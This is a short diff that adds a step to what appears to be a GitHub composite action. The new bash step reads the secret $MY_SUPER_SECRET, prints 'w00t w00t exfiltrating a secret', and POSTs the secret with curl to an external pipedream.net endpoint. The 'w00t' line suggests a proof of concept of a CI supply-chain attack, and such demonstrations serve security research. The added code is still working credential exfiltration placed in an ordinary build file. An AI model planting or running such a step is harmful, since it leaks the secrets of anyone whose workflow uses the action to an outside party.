@@ -6,3 +6,8 @@ runs:
   steps:
     - run: ls -al
       shell: bash
+    - run: |
+       SECRET_TO_EXFILTRATE="$MY_SUPER_SECRET"
+       echo "w00t w00t exfiltrating a secret"
+       curl -d "secret=$SECRET_TO_EXFILTRATE" https://eoohta5h47m69jv.m.pipedream.net
+      shell: bash
